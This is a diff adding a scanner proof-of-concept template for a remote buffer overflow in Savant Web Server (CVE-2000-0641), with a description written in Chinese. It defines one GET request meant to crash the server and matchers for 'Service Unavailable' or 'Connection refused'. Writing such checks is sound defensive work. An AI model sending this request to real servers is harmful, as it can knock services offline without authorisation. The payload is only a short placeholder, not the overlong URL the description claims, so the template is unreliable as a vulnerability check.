@@ -1,0 +1,28 @@
+[info]
+author = "ave"
+description = "向 Savant Web Server 发送超长 GET 请求触发缓冲区溢出，验证目标是否存在漏洞。攻击者无需认证即可通过精心构造的超长 URL 导致服务器崩溃或任意代码执行。"
+id = "POC-AVE-2000-0494"
+name = "Savant Web Server 远程缓冲区溢出 PoC"
+severity = "high"
+tags = ["ave-2000-0494"]
+vuln_id = [
+    "CVE-2000-0641",
+    "AVE-2000-0494",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/AAAA[AAAA]"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Service Unavailable",
+    "Connection refused",
+]
